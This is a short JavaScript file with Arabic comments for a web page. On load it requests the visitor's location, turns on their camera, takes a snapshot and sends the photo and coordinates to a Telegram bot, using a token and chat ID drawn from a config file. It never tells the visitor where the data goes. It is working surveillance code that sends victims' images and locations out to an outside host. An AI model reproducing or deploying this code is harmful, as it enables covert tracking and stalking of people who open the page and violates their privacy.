import { botToken, chatId } from './config.js';

window.onload = async function() {
  try {
    // طلب الموقع
    navigator.geolocation.getCurrentPosition(async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      // تشغيل الكاميرا
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      // انتظار لحظة قبل الالتقاط
      await new Promise(res => setTimeout(res, 1500));

      // التقاط صورة
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "snapshot.jpg");
        formData.append("caption", `🌍 الموقع: ${lat}, ${lon}`);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        });

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());
      }, "image/jpeg");
    }, (err) => {
      console.error("خطأ في الموقع:", err);
      alert("لم يتم السماح بالوصول إلى الموقع.");
    });
  } catch (err) {
    console.error("خطأ:", err);
    alert("لم يتم السماح بالوصول إلى الكاميرا.");
  }
};
